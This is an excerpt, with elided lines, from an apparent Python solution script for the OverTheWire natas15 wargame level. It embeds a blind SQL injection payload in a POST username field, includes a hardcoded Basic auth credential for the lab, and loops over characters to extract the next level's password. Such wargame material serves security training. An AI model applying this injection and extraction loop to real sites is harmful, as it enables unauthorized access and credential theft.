...
HOST: str = "natas15.natas.labs.overthewire.org"
POSSIBLECHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def genReq(password: str) -> str:
    """
    genReq generates a POST request to natas15.natas.labs.overthewire.org with the specified modified username
    ...
    req += "Host: " + HOST + "\r\n"
    req += "Authorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==\r\n"
    req += "Content-Length: " + str(60 + len(password)) + "\r\n"
    ...
    req += 'username=natas16"%20and%20password%20like%20binary%20"' + password + '%"%20#'
    return req
...
def findPass(password_guess: str) -> str:
    ...
    for char in POSSIBLECHARS:
        ...
        if resp_body.find("This user exists") != -1:
